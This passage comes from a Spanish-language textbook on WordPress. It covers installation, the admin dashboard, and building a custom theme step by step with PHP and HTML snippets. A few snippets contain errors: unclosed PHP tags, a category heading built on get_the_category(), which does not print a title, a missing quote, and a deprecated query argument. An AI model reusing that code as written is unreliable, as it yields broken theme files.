sistema. En el ámbito de los plugins también hay mucho trabajo potencial para un futuro desarrollador/a web como tú: tanto para crear plugins nuevos y adaptados a las necesidades del cliente como para optimizar y racionalizar el uso de plugins existentes en los sitios que ya están en funcionamiento. Por último, y al igual que ocurría con las plantillas, tienes que saber que muchos plugins son gratuitos, otros son de pago, y otros tienen versiones gratuitas que se vuelven de pago cuando queremos utilizar sus características más atractivas. Fallos de seguridad de Wordpress . Las críticas más contundentes contra Wordpress siempre se han centrado en sus problemas de seguridad. En mayo de 2007, por ejemplo, un estudio reveló que el 98% de los blogs basados en Wordpress eran vulnerables a ataques. Todos los sistemas que se vuelven muy populares se vuelven inseguros por el simple hecho de que se multiplican los ataques contra ellos. La receta para minimizar los posibles problemas de seguridad es sencilla: mantener Wordpress actualizado. No podemos hacer mucho más allá de eso. 1.2.2. Instalación y explotación de Wordpress . Instalación de Wordpress . Wordpress es un CMS increíblemente sencillo de instalar y poner en marcha. El proceso de instalación se ha depurado tanto, que cualquier usuario medio sin especiales conocimientos técnicos puede llevarlo a cabo. Como tú no eres un usuario/a medio, no vamos a detenernos mucho en ello, porque es realmente sencillo. A continuación, resumimos los pasos: . | Necesitas, obviamente, ciertos prerrequisitos: acceso a un servidor web con soporte para PHP y un servidor de bases de datos MariaDB o similar. | Crea una base de datos vacía. Puedes llamarla como quieras (siempre que recuerdes el nombre, claro). | Descarga el código fuente de Wordpress (¡solo del sitio oficial, por favor! Es decir, de wordpress.org) y súbelo a una carpeta en tu servidor. La carpeta debe ser accesible vía web. Puedes usar FTP para ello. Muchos servidores tienen un navegador de archivos vía web que también te permitirá subir el código fuente. Otros servidores incluso te ofrecen la posibilidad de instalar Wordpress desde el propio panel de control de servidor. Consulta con tu proveedor o trastea con el panel de control para ver si es tu caso. | Lanza el programa de instalación. Esto se logra, simplemente, escribiendo la URI de tu wordpress. Algo como https://tu-servidor/tu-carpeta, donde “tu-servidor” es el nombre de dominio de tu servidor y “tu-carpeta” es la carpeta donde subiste el código fuente de Wordpress. | Aparecerá una pantalla como esta. A partir de aquí, solo tienes que seguir las instrucciones. | . Explotación de Wordpress . Una vez que tienes instalado tu Wordpress en el servidor, ya dispones de un sitio en línea que puedes visitar en la URI https://tu-servidor/tu-carpeta. El sitio es por completo funcional pero, obviamente, está vacío de contenido. Su aspecto será más o menos como este: . Lo que estás viendo aquí es la plantilla (theme) por defecto de Wordpress. Dependiendo de la versión que instales, tendrá un aspecto algo diferente. Una instalación nueva también incorpora una publicación (post) de ejemplo (con un comentario también de ejemplo), así como una página estática. Lo siguiente que tienes que hacer es acceder al panel de administración, que estará hubicado en https://tu-servidor/tu-carpeta/wp-admin. Verás una pantalla de login donde tendrás que introducir el usuario y la contraseña de administración de Wordpress. Estas credenciales las seleccionaste durante el proceso de instalación. Una vez traspasada la puerta del login, encontrarás una pantalla con la que debes familiarizarte: el panel de administración o dashboard de Wordpress. El resto de tu trabajo consistirá en familiarizarte con este panel de administración. Es una aplicación web muy completa e intuitiva, y a cualquier usuario/a un poco avezado no le costará trabajo hacerse con ella, e incluso le resultará divertido. No hay que decir que no necesitas saber nada de programación para manejar este panel. Solo a modo de introducción, te resumo las secciones principales que puedes encontrar en el dashboard de Wordpress, accesibles mediante el menú de la izquierda: . | Post. Son las publicaciones de Wordpress (recuerda que, originalmente, era una herramienta para hacer blogging). Los artículos se crean con un sencillo editor WYSIWYG al que se le pueden ir añadiendo bloques. Hay multitud de opciones de configuración de cada artículo: a qué categoría pertenecen, qué etiquetas tienen, si se permiten o no los comentarios, la fecha de la publicación, la autoría, etc. | Media. Es la biblioteca multimedia. Desde aquí se organizan todos los recursos multimedia: imágenes, vídeos, audios, documentos… Cualquiera de esos recursos puede incrustarse en cualquier post. | Pages. Son las páginas estáticas de Wordpress. A diferencia de los posts, no se organizan cronológicamente ni se pueden asignar a categorías. Se utilizan para las páginas cuyo contenido debe estar siempre accesible y cambia poco con el tiempo: “Acerca de”, “Contacto” y cosas así. | Comments. Desde aquí se moderan los comentarios que los visitantes hayan hecho a los posts. | . Aquí termina la parte del dashboard dedicada a gestionar el contenido del sitio. El resto de menús se dedican a gestionar la apariencia y configuración del sitio: . | Appearance: Aquí se manipulan las plantillas (themes), los widgets, los menús… Pasarás incontables horas de diversión (y desesperación) en esta sección. | Plugins: No te desvelo nada nuevo si te digo que desde aquí gestionas los plugins, ¿verdad? | Users: Puedes dar acceso a otros usuarios a tu Wordpress. Hay varios niveles o roles de acceso: administrador, editor, publicador… Cada rol verá un menú de administración diferente. | Tools: Diferentes herramientas útiles. Importar y exportar contenido son las principales. Muchos plugins añadirán opciones a este menú (otros las añadirán en otra parte). | Settings: Opciones de configuración del sitio. Aquí se pueden cambiar muchas cosas muy importantes: el nombre del sitio, el formato de las URIs, si se permiten o no comentarios por defecto, si los comentarios se publican inmediatamente o tiene que moderarlos un administrador. Conviene que te pases un rato curioseando y probando cosas. | . 1.2.3. Breve tour por Wordpress para novatos . Todo esto puede parecer complicadísimo, pero Wordpress (a nivel de usuario) es muy secillo de usar cuando has pasado un poco de tiempo con él. Si es tu primera vez con Wordpress, te recomiendo que te prepares un café (o tu infusión favorita), te sientes sin prisa ante el ordenador en algún momento en el que no te vayan a interrumpir durante varias horas y dediques una sesión intensiva a hacer lo siguiente: . | Instala un Wordpress de prueba en tu servidor local o en un servidor remoto si aún no lo has hecho. | Accede al panel de administración. | Crea dos o tres categorías. Antes deberás decidir qué temática tendrá tu sitio. Utiliza algún tema de tu interés: un deporte, la tecnología, la programación, el cine, la literatura… Si usas algo que te interese, la experiencia será mucho más fructífera. Por ejemplo, si tu temática es “programación”, podrías crear las categorías “Java”, “PHP” y “Python”, por decir algo. | Crea un par de entradas por cada categoría. No tienen que ser nada especial: solo estamos jugueteando. Copia y pega texto de alguna otra publicación de internet. O redáctalas tú, como prefieras. Asegúrate de incluir alguna imagen y otros elementos multimedia. | Crea alguna página (“Acerca de”, “Sobre mí”, “Contacto” o algo así). | Cambia de plantilla. Prueba varias que te gusten y, cuando te decidas por una, métete en sus opciones de configuración y trastea un rato. Algunas plantillas son configurables hasta límites enfermizos. Otras, en cambio, son muy limitadas. No olvides ir observando cómo estos cambios afectan a la forma en la que los visitantes verían en blog. | Instala algunos plugins de prueba que te parezcan interesantes. Por ejemplo, galerías de imágenes o formularios de contacto. | Crea algunos usuarios adicionales con distintos roles. Accede con ellos al panel de administración para ver las diferencias entre unos roles y otros. | Juguetea sin miedo con las opciones del menu “Settings”. Algunas de ellas podrían dejar tu Wordpress totalmente inoperativo. ¡Bienvenido a la vida real! Trata de resolver el problema bicheando en internet. Antes o después, eso mismo te ocurrirá con sitios reales. | . Cuando termines esta experiencia inmersiva (que puede llevarte varios días), estarás en condiciones de montar un sitio web con Wordpress real. 1.2.4. Cómo crear y modificar una plantilla de Wordpress . Wordpress dispone de una API de funciones útiles para desarrollar nuestras propias plantillas (themes) y plugins. Como vamos a hacer a lo largo de todo el texto, veremos este asunto de forma práctica: creando nuestra propia plantilla desde cero. Por cierto, que a lo largo de toda la sección nos referiremos indistintamente a las plantillas de Wordpress como plantillas, temas o themes, pues así lo encontrarás en toda la documentación que consultes. ¿Estás preparado/a? ¡Vamos allá! . Las plantillas o temas de Wordpress . Como ya hemos dicho, existen muchos sitios web donde adquirir plantillas (themes), empezando por el propio sitio oficial de Wordpress. Algunas son gratuitas, otras de pago, y otras tienen versiones gratuitas incompletas o parcialmente desactivadas, y versiones de pago que permiten usar todas las funcionalidades. Pero, a veces, queremos ir un paso más allá y desarrollar nuestra propia plantilla. Para ello, tenemos dos opciones: . | Utilizar una plantilla base. Existen muchas plantillas básicas diseñadas para ser usadas como base para desarrollar nuevas plantillas. Contienen todos los elementos mínimos necesarios de una plantilla de Wordpress, además de otras características, de modo que el trabajo de creación de la nueva plantilla se minimiza. Estas plantillas a veces también se llaman frameworks Algun plantillas básicas muy conocidas son Bones, Basic o Divi. Los desarrolladores profesionales pueden acabar creando su propia plantilla base a partir de la cual crear el resto de plantillas a su gusto. | Desarrollar la plantilla desde cero. Este proceso es más costoso en tiempo, pero conseguiremos aproximarnos más a lo que estamos buscando, evitando estar atados a un framework que no hemos programado nosotros y conservando el control absoluto sobre los archivos y contenidos de la plantilla. | . En este texto vamos a decantarnos por la segunda opción, no porque sea mejor ni peor, sino porque es lo más didáctico si pretendemos aprender cómo se organizan las plantillas de Wordpress. Dónde localizar las plantillas instaladas . Puedes encontrar los temas instalados a través del panel de administración (dashboard) de tu Wordpress, en el menú Appearance -&gt; Themes. Pero, para nuestros propósitos, es mejor hacerlo navegando directamente entre las carpetas del servidor, en la ruta carpeta-de-wordpress -&gt; wp-content -&gt; themes. Ahí encontrarás una carpeta por cada plantilla de Wordpress instalada en tu sistema. Bastará, entonces, con crear una carpeta nueva para iniciar la construcción de nuestra plantilla. A partir de ahora supondremos que estamos creando un nuevo tema llamado mi-tema. Es decir, dentro de la carpeta themes, habremos creado un directorio llamado mi-tema. Archivos mínimos de un tema de Wordpress . Wordpress funciona mediante módulos. Por ejemplo, para insertar el pie de una página habremos de llamar al archivo footer.php, en caso de que exista. Y lo mismo con la cabecera, la barra de navegación, etc. Cada uno de esos elementos es un módulo. Una plantilla de Wordpress puede estar formada por muchos archivos, pero para que un tema de Wordpress funcione sólo necesita dos archivos: index.php y style.css. Está claro que con sólo estos dos archivos tendremos un tema muy básico, pero será considerado por Wordpress un tema válido si estos dos archivos están bien configurados. A continuación vamos a desarrollar una plantilla completa que nos sirva de base para otros proyectos. Contendrá una cabecera, un pie y una barra lateral. No pretendemos desarrollar una plantilla supercompleja con funciones avanzadas, claro, pero sí una bastante completa que podamos usar por sí misma o como base para proyectos más complejos. Nuestro tema va a tener la mayor parte de los archivos habituales en los temas “profesionales”. ¿Qué cuáles son esos archivos? Aquí tienes una lista con una breve explicación de cada uno: . | /images. Carpeta con las imágenes de la plantilla. | /js. Carpeta con los archivos de JavaScript. | style.css. Hoja de estilos de la plantilla. Obligatoria para que la plantilla funcione. | index.php. Página principal. Obligatoria para que la plantilla funcione. | screenshot.png. Imagen en miniatura. Se verá en el dashboard de Wordpress (menú Apariencia -&gt; Temas). | favicon.ico. La imagen que se verá en el navegador (o al guardar el sitio como un marcador). | header.php. Cabecera de la plantilla. | sidebar.php. Barra lateral de la plantilla. | footer.php. Pie de página de la plantilla. | single.php. Una entrada (post) individual. | page.php. Una página estática individual. | category.php. Página de resultados de una categoría. | tag.php. Página de resultados de una etiqueta. | search.php. Página de resultados de búsqueda. | functions.php. Funciones genéricas de nuestra plantilla (accesibles desde todos los archivos de la misma). | . Como es lógico, para crear una buena plantilla es fundamental que poseas un buen dominio de HTML y CSS. Si no, mejor dedícate a otra cosa (por ejemplo, a aprender HTML y CSS). En el resto de esta sección, vamos a construir nuestra plantilla en 11 sencillos pasos. Bueno, o no tan sencillos, eso ya lo decides tú… . Paso 1: La hoja de estilos (style.css) . El primer paso para construir una plantilla de Wordpress siempre es el archivo style.css (dentro de la carpeta “mi-tema”). Ese archivo debe abrirse con estas líneas de comentario para que Wordpress lo reconozca como la hoja de estilos de la plantilla y la información aparezca en Apariencia -&gt; Temas: . /* Theme Name: Mitema Theme URI: el lugar donde vayas a alojar el tema para ponerlo a disposición de la comunidad Description: La descripción del tema Author: Tu nombre y apellidos Author URI: la web profesional del creador del tema Version: 1.0 */ . A partir de aquí, puedes escribir tu propio código de CSS como harías con cualquier otra página web. De momento, puedes dejarlo así e ir añadiendo reglas CSS más adelante. Paso 2: Imágenes y JavaScript (subdirectorios /images y /js) . Para este theme vamos a utilizar dos pequeñas librerías Javascript: . | Modernizr, que sirve para detectar las capacidades de HTML5 y CSS3 del navegador (por si nos topamos con un navegador anticuado, cosa que es, lamentablemente, más frecuente de lo que pueda parecer). | Respond, que sirve para que las versiones jurásicas de Internet Explorer sepa interpretar los media queries de CSS3. | . Te lo confieso: podríamos crear nuestra plantilla sin estas librerías, pero las usaremos de excusa para que veas cómo se integra una librería Javascript en una plantilla de Wordpress. Para alojar ese tipo de contenido adicionarl, vamos a crear las carpetas “images” y “js” dentro de la carpeta “mi-tema”. | En la carpeta “js” colocaremos una copia de las librerías Modernizr y Respond (¡siempre bajadas de la web del desarrollador, por favor!). | En la carpeta “images” colocaremos más adelante las imágenes que vayamos necesitando para nuestro CSS. ¡Ojo! Hay dos archivos de imagen obligatorios para todas las plantillas Wordpres, screenshot.png y el favicon.ico, pero estos se deben ubicar en el directorio raíz del tema y no dentro de la carpeta “images”. Recuerda que Wordpress utiliza estos dos archivos para la previsualización del tema y para el icono de la página una vez que el tema se active. | . Paso 3: Crear la cabecera del tema y el menú de navegación (header.php) . El archivo header.php contiene la cabecera de todas las páginas que se carguen con nuestro tema. Es el lugar donde suele ponerse el logo, el menú principal, un banner con imágenes o cualquier otra cosa que queramos que aparezca en la parte superior de todas las páginas del sitio web. Este es un código sencillito para empezar con header.php: . &lt;!DOCTYPE html&gt; &lt;html &lt;?php language_attributes(); ?&gt;&gt; &lt;head&gt; &lt;meta charset= &lt;?php bloginfo( 'charset' ); ?&gt;\"&gt; &lt;title&gt;&lt;?php wp_title(); ?&gt;&lt;/title&gt; &lt;!-- Definimos el viewport para dispositivos móviles --&gt; &lt;meta name=\"viewport\" content=\"width=device-width, minimum-scale=1\"&gt; &lt;link rel=\"shortcut icon\" href=\"&lt;?php echo get_stylesheet_directory_uri(); ?&gt;/favicon.ico\" /&gt; &lt;link rel=\"stylesheet\" media=\"all\" href=\"&lt;?php bloginfo( 'stylesheet_url' ); ?&gt;\" /&gt; &lt;link rel=\"pingback\" href=\"&lt;?php bloginfo( 'pingback_url' ); ?&gt;\" /&gt; &lt;?php wp_head(); ?&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"wrapper\"&gt; &lt;header&gt; &lt;h1&gt;&lt;a href=\"&lt;?php echo get_option('home'); ?&gt;\"&gt;&lt;?php bloginfo('name'); ?&gt;&lt;/a&gt;&lt;/h1&gt; &lt;hr&gt; &lt;?php wp_nav_menu( array('menu' =&gt; 'Main', 'container' =&gt; 'nav' )); ?&gt; &lt;/header&gt; . Echa un vistazo al código sin miedo. La mayor parte es HTML, y solo hay un toquecito de PHP aquí y allá. ¿Qué dices? ¿Qué aún no sabes PHP? Verás, no hay mucho que entender aquí, así que no te asustes a la primera de cambio. Vamos a analizar el código línea a línea para que entiendas lo que hace: . | Observa que, después del doctype, hemos usado un poquito de PHP para indicar el idioma de la instalación de Wordpress, utilizando en PHP la función language_attributes(). Esa es una de las muchas funciones del API de Wordpress que podemos llamar desde PHP, pero no desde HTML. | Observa también que todo el código PHP tiene que ir entre las etiquetas “&lt;?php&gt;” y “?&gt;”, aunque seguro que ya te habías dado cuenta de eso si realmente has intentado leer el código, ¿verdad? . | En la siguiente línea, y con el objetivo de asignar el charset, también hemos recurrido a una función de Wordpress (bloginfo()), así como para el título de la página (función wp_title()). Todas esas funciones deben llamarse desde PHP, por lo que abrimos y cerramos las etiquetas “&lt;?php&gt;” y “?&gt;” cada vez que lo necesitamos. | Más abajo especificaremos el viewport. Si tu tema no va a ser responsivo, puedes quitar esta línea de código. | Justo después, para mostrar la URL al favicon.ico le indicamos la ruta a la carpeta “mi-tema” de la instalación de Wordpress. Eso se consigue con la función de Wordpress get_stylesheet_directory_uri(). | Un poco más abajo se usa la función bloginfo() con el argumento ‘stylesheet_directory’, que tiene el mismo efecto que get_stylesheet_directory_uri(). | Finalmente, se usa la función wp_head() de Wordpress, necesaria para que los plugins y otras funcionalidades de Wordpress estén disponibles en las páginas cargadas con nuestro tema. A partir de aquí cerramos la etiqueta head de HTML y empezamos con los contenidos de body. | . Quizás en este punto te estés preguntando por qué incluir el body en header.php. La razón es sencilla: algunos contenidos de la cabecera del tema van a aparecer en todas las páginas del sitio web, por lo que, al incluirlo aquí, evitamos duplicar código y logramos que el mantenimiento del tema sea más sencillo. Así, dentro de la sección “&lt;header&gt;” del body HTML, incluiremos nuestra cabecera. En este ejemplo, hemos puesto el nombre del sitio web con un enlace a la página de inicio: . &lt;h1&gt;&lt;a href=\"&lt;?php echo get_option('home'); ?&gt;\"&gt;&lt;?php bloginfo('name'); ?&gt;&lt;/a&gt;&lt;/h1&gt; . Fíjate que dentro del “&lt;header&gt;” hemos escrito esta línea: . &lt;?php wp_nav_menu( array('menu' =&gt; 'Main', 'container' =&gt; 'nav' )); ?&gt; . Sirve para crear el menú de navegación. Para que funcione correctamente, primero deberemos añadir al archivo functions.php (que contiene las funciones propias del tema, como dijimos antes) este código: . &lt;?php // Registro del menú de Wordpress add_theme_support( 'nav-menus' ); if ( function_exists( 'register_nav_menus' ) ) { register_nav_menus( array( 'main' =&gt; 'Main' ) ); } ?&gt; . Este código crea un menú llamado “Main” que nos aparecerá en el panel de administración de Wordpress, en Apariencia -&gt; Menús. Lo que este código dice es que si existe una función llamada register_nav_menus, entonces debe crearse un nuevo menú de navegación llamado Main. Además, la función de Wordpress add_theme_support() sirve para indicar que en este tema queremos poder crear menús dinámicos. A partir de aquí, simplemente habremos de ir a Apariencia -&gt; Menús en el Dashboard de Wordpress, crear nuestro menú y guardarlo, como con cualquier otro theme. Con esto ya tenemos la cabecera del tema creada junto con su menú de navegación. Paso 4: Crear la barra lateral para widgets (sidebar.php) . Si has trasteado un poco con Wordpress, te habrás dado cuenta de que la mayoría de los temas incluyen una barra lateral a la derecha o a la izquierda del contenido principal. Bueno, algunos incluyen varias barras laterales, pero vamos a centrarnos en una, que es lo más frecuente. Las barras laterales suelen utilizarse para contener los widgets. Hay temas que admiten widgets (la mayoría) y otros que no. Lo primero que tendremos que hacer, entonces, es informar a Wordpress de que nuestro tema sí admite widgets. Para ello, abriremos de nuevo el archivo functions.php e incluiremos esta función: . &lt;?php // Main Sidebar if(function_exists('register_sidebar')) register_sidebar(array( 'name' =&gt; 'Main Sidebar', 'before_widget' =&gt; '&lt;hr&gt;', 'after_widget' =&gt; '', 'before_title' =&gt; '&lt;h3&gt;', 'after_title' =&gt; '&lt;/h3&gt;', )); ?&gt; . Si activamos este tema y vamos al dashboard de Wordpress, en el menú Apariencia -&gt; Widgets veremos que nos aparece una nueva zona de widgets llamada “Main Sidebar”. Una vez creada la zona lista para widgets, vamos a llamarla dentro del archivo sidebar.php, otro archivo típico de casi todas las plantillas. Creamos este archivo y escribimos: . &lt;section id=\"sidebar\"&gt; &lt;?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Main Sidebar') ) : ?&gt; &lt;?php endif; ?&gt; &lt;/section&gt; . Hemos utilizado un id llamado “sidebar” porque en este tema sólo va a existir una barra lateral. Si quieres que tu tema tenga más barras laterales, quizás prefieras utilizar una clase “sidebar” en lugar de un id. Y listo, ya tenemos creada la barra lateral lista para contener widgets. Paso 5: Crear el pie de página (footer.php) . Llega el momento de crear otro elemento común en casi todos los temas: el pie que aparecerá en todas las páginas del sitio web. Recuerda que Wordpress funciona por módulos, y que los módulos son como piezas de un puzle: hasta ahora hemos ido creando esas piezas (header, sidebar, y ahora el footer) para luego montarlas todas en index.php. Pero eso será un poco más adelante. Ahora centrémonos en el footer. El footer se crea, oh sorpresa, en un archivo llamado footer.php que puede quedarnos así: . &lt;footer&gt; &lt;p&gt;&amp;amp;amp;amp;copy; &lt;?php bloginfo('name'); ?&gt;, &lt;?=date('Y');?&gt;. Mi primer tema.&lt;/p&gt; &lt;/footer&gt; &lt;/div&gt; &lt;!-- Fin de wrapper --&gt; &lt;?php wp_footer(); ?&gt; &lt;/body&gt; &lt;/html&gt; . Fíjate en que la capa id=”wrapper” empezó en el header y la terminamos ahora, en el footer. Esto es lo más habitual, pero si queremos un header o un footer que se extienda por toda la pantalla, podemos mover las posiciones de los div que abren y cierran la capa “wrapper”. Aquí aparece una llamada a la función de Wordpress wp_footer(), que es semejante a wp_header(). Estas funciones son lo que se llaman hooks de Wordpress y hacen funcionar los plugins que instalemos. Si no la incluyes, tu tema funcionará, pero la mayor parte de los plugins, no. Paso 6: Crear la página principal (index.php) . La página principal se diseña en el archivo index.php. Nuestro index tendrá inicialmente este aspecto: . &lt;?php get_header(); ?&gt; &lt;section id=\"main\"&gt; &lt;/section&gt; &lt;!-- Fin de main --&gt; &lt;?php get_sidebar()?&gt; &lt;?php get_footer(); ?&gt; . Observa estas tres funciones clave del API de Wordpress: . | get_header() inserta los contenidos del archivo header.php en ese punto. | get_sidebar() hace lo mismo con la barra lateral. | get_footer() hace… bueno, ya te imaginas lo que hace, ¿verdad? | . Así montamos nuestro puzle de tres piezas. Fácil, ¿no? Sí, sí, un puzle muy sencillo, pero con la estructura básica de muchos temas de Wordpress. Y, en cualquier caso, podemos complicarlo añadiendo más cosas. Que es justo lo que vamos a hacer ahora… . Paso 7. El loop de Wordpress (otra vez index.php) . En el loop reside toda la magia de Wordpress. ¿Qué es el loop? Es un bucle (claro) en el que se muestran las entradas almacenadas en la base de datos de Wordpress. Y nosotros podemos decidir cómo se muestran esas entradas. Este código de ejemplo de loop debe añadirse a continuación del anterior en index.php: . &lt;?php if (have_posts()) : while (have_posts()) : the_post(); ?&gt; &lt;h2&gt;&lt;a href=\"&lt;?php the_permalink(); ?&gt;\"&gt;&lt;?php the_title(); ?&gt;&lt;/a&gt;&lt;/h2&gt; &lt;small&gt;Publicado el &lt;?php the_time('j/m/Y') ?&gt; por &lt;?php the_author_posts_link() ? &lt;/small&gt; &lt;?php the_excerpt(); ?&gt; &lt;?php endwhile; else: ?&gt; &lt;p&gt;&lt;?php _e('No hay entradas .'); ?&gt;&lt;/p&gt; &lt;?php endif; ?&gt; . La primera línea constituye el auténtico loop: . &lt;?php if(have_posts()) : ?&gt;&lt;?php while(have_posts()) : the_post(); ?&gt; . Wordpress mirará si hay alguna entrada disponible (if(have_posts())). Si es así, entramos en un bucle que se repite para todos los posts (while(have_posts())). Y, para cada post, se recupera su contenido de la base de datos (the_post()). Una vez seleccionado el post, se muestra su información: la fecha de publicación (the_time()), los autores (the_author_posts_link()), el extracto (the_excerpt())… Si no hay posts, se muestra el mensaje de “No hay entradas”. Paso 8. Añadir thumbnails al loop (seguimos en index.php) . Si queremos añadir thumbnails (imágenes destacadas) a cada publicación como sucede en muchos sitios web, lo que haremos es lo siguiente: vamos al archivo functions.php y añadimos este código: . &lt;?php //Habilitar thumbnails add_theme_support('post-thumbnails'); set_post_thumbnail_size(200, 150, true); ?&gt; . Con este código hemos habilitado los thumbnails de nuestras entradas y hemos establecido un tamaño para los mismos de 200x150 píxeles. Una vez hecho esto, modificaremos el loop de index.php como sigue: . &lt;?php if (have_posts()) : while (have_posts()) : the_post(); ?&gt; &lt;h2&gt;&lt;a href=\"&lt;?php the_permalink(); ?&gt;\"&gt;&lt;?php the_title(); ?&gt;&lt;/a&gt;&lt;/h2&gt; &lt;small&gt;Publicado el &lt;?php the_time('j/m/Y') ?&gt; por &lt;?php the_author_posts_link() ?&gt; &lt;/small&gt; &lt;div class=\"thumbnail\"&gt; &lt;?php if ( has_post_thumbnail() ) { the_post_thumbnail(); } ?&gt; &lt;/div&gt; &lt;?php the_excerpt(); ?&gt; &lt;?php endwhile; else: ?&gt; &lt;p&gt;&lt;?php _e('No hay entradas .'); ?&gt;&lt;/p&gt; &lt;?php endif; ?&gt; . Observa que hemos añadido un par de líneas en las que se comprueba si el post tiene thumbnail y, en caso afirmativo, lo recuperamos de la base de datos y lo mostramos (función the_post_thumbnail()). La forma concreta en la que queremos que se visualice todo esto debe establecerse mediante CSS, por supuesto, en el archivo style.css. Vamos a dejar de añadir cosas loop en este punto, pero podríamos seguir ìncorporando elementos. Por ejemplo, una paginación de las entradas. Encontrarás en la red mucha información sobre el tema, aunque lo más práctico es bajarse una plantilla sencillita ya hecha que incluya lo que sea que queremos hacer y curiosear en su código fuente. Paso 9. Resultados de la búsqueda (search.php) . Los resultados de la búsqueda se especifican en el archivo search.php. He aquí un ejemplo: . &lt;?php get_header(); ?&gt; &lt;section id=\"main\"&gt; &lt;h2&gt;Resultados de la búsqueda&lt;/h2&gt; &lt;?php if (have_posts()) : while (have_posts()) : the_post(); ?&gt; &lt;h2&gt;&lt;a href=\"&lt;?php the_permalink(); ?&gt;\"&gt;&lt;?php the_title(); ?&gt;&lt;/a&gt;&lt;/h2&gt; &lt;small&gt;Publicado el &lt;?php the_time('j/m/Y') ?&gt; por &lt;?php the_author_posts_link() ?&gt; &lt;/small&gt; &lt;div class=\"thumbnail\"&gt; &lt;?php if ( has_post_thumbnail() ) { the_post_thumbnail(); } ?&gt; &lt;/div&gt; &lt;?php the_excerpt(); ?&gt; &lt;?php endwhile; ?&gt; &lt;?php if (function_exists(\"pagination\")) { pagination($additional_loop-&gt;max_num_pages); } ?&gt; &lt;?php else: ?&gt; &lt;div class=\"entry\"&gt;&lt;?php _e('Lo sentimos, no hay resultados con este término de búsqueda.'); ?&gt;&lt;/div&gt; &lt;?php endif; ?&gt; &lt;/section&gt; &lt;!-- Fin de main --&gt; &lt;?php get_sidebar()?&gt; &lt;?php get_footer(); ?&gt; . Fíjate qué curioso: se parece mucho a index.php. Tiene sentido, puesto que el resultado de una búsqueda no es otra cosa que una lista de posts. Esta página es la que va a mostrar los resultados de una búsqueda, así que vamos a necesitar habilitar el buscador en nuestro theme. Un buen sitio para colocarlo puede ser el sidebar. Iremos a nuestro archivo sidebar.php y, justo antes de la función que habilita la zona de widgets en la barra lateral, incluiremos este código: . &lt;form method=\"get\" id=\"searchform\" action=\"&lt;?php bloginfo('url'); ?&gt;/\"&gt; &lt;input type=\"text\" placeholder=\"Buscar…\" value=\"&lt;?php the_search_query(); ?&gt;\" name=\"s\" id=\"s\" /&gt; &lt;button type=\"submit\" class=\"icon-only\" id=\"searchsubmit\"&gt;&lt;/button&gt; &lt;/form&gt; . Con esto tenemos un campo de búsqueda en nuestra barra lateral. No olvides que en el archivo style.css debes dar formato a todas las clases e ids para que la plantilla se visualice como tú quieras. Paso 10. Configurar la vista de las entradas (single.php) . La página de cada entrada o post individual es aquella donde solo se ve una entrada con todo su contenido. El archivo donde se define esto es single.php, y puede ser más o menos así: . &lt;?php get_header(); ?&gt; &lt;section id=\"main\"&gt; &lt;article id=\"single\"&gt; &lt;?php if(have_posts()) : ?&gt;&lt;?php while(have_posts()) : the_post(); ?&gt; &lt;h2&gt;&lt;a href=\"&lt;?php the_permalink() ?&gt;\" rel=\"bookmark\" title=\"Enlace permanente a &lt;?php the_title_attribute(); ?&gt;\"&gt;&lt;?php the_title(); ?&gt;. &lt;/a&gt;&lt;/h2&gt; &lt;small&gt; Publicado por &lt;?php the_author_posts_link() ?&gt; el &lt;?php the_time('j/m/Y') ?&gt;. Categoría: &lt;?php the_category(', '); ?&gt; &lt;/small&gt;&lt;br&gt; &lt;div class=\"post\"&gt; &lt;?php the_content(); ?&gt; &lt;/div&gt; &lt;?php endwhile; ?&gt; &lt;?php endif; ?&gt; &lt;/article&gt; &lt;!-- Fin de single --&gt; &lt;/section&gt; &lt;!-- Fin de main --&gt; &lt;?php get_sidebar()?&gt; &lt;?php get_footer(); ?&gt; . Si has llegado hasta aquí, te resultará fácil comprender este código. Si en el loop principal (en index.php) utilizamos the_excerpt() para mostrar el extracto de la entrada, aquí utilizamos la función the_content() para recuperar el contenido completo de la entrada. Por supuesto, esto se puede complicar hasta el infinito. A modo de ejemplo, observa cómo podríamos mostrar las entradas relacionadas: . &lt;?php $tags = wp_get_post_tags($post-&gt;ID); if ($tags) { $tag_ids = array(); foreach($tags as $individual_tag) $tag_ids[] = $individual_tag-&gt;term_id; $args=array( 'tag__in' =&gt; $tag_ids, 'post__not_in' =&gt; array($post-&gt;ID), 'showposts'=&gt;5, // Number of related posts that will be shown. 'caller_get_posts'=&gt;1 ); $my_query = new wp_query($args); if( $my_query-&gt;have_posts() ) { echo '&lt;h3&gt;Artículos relacionados&lt;/h3&gt;&lt;ul&gt;'; while ($my_query-&gt;have_posts()) { $my_query-&gt;the_post(); ?&gt; &lt;li&gt;&lt;a href=\"&lt;?php the_permalink() ?&gt;\" rel=\"bookmark\" title=\"Permanent Link to &lt;?php the_title_attribute(); ?&gt;\"&gt;&lt;?php the_title(); ?&gt;&lt;/a&gt;&lt;/li&gt; &lt;?php } echo '&lt;/ul&gt;'; } wp_reset_query(); } ?&gt; . Paso 11: Habilitar y mostrar los comentarios . Para permitir los comentarios en una entrada, añadiremos este código a nuestro archivo functions.php: . // Permitir comentarios encadenados function enable_threaded_comments(){ if (is_singular() AND comments_open() AND (get_option('thread_comments') == 1)) { wp_enqueue_script('comment-reply'); } } add_action('get_header', 'enable_threaded_comments'); . Y en single.php, justo antes de la línea del endwhile, escribiremos: . &lt;div class=\"comentarios\"&gt; &lt;?php comments_template(); ?&gt; &lt;/div&gt; . Nuevamente, será el CSS, como es lógico, el que determine cómo se verán los comentarios. Paso 12: Crear la página de categorías y etiquetas . Los archivos category.php y tags.php muestran, en ambos casos, una lista de entradas: . | category.php muestra las entradas que pertenecen a una categoría. | tags.php muestra las entradas que contienen una etiqueta concreta. | . Eso significa que, de cara a la creación de la plantilla, los dos archivos son prácticamente iguales entre sí, y que los dos archivos contienen un loop muy semejante al de index.php. Para nuestra plantilla de ejemplo, te sugerimos que, en lugar de crear esos dos archivos, añadas esto antes del loop de index.php: . &lt;?php $post = $posts[0]; ?&gt; &lt;?php if (is_category()) { ?&gt; &lt;h2&gt;Categoría: &lt;?php get_the_category(); &gt;&lt;/h2&gt; &lt;?php } elseif( is_tag() ) { ?&gt; &lt;h2&gt;Etiqueta: &lt;?php single_tag_title(); ?&gt;&lt;/h2&gt; &lt;?php } ?&gt; . Cuando Wordpress vaya a mostrar, por ejemplo, la lista de artículos de una categoría, buscará el archivo category.php en la plantilla pero, como no lo encontrará, recurrirá a index.php. Y nuestro archivo index.php detectará que está mostrando 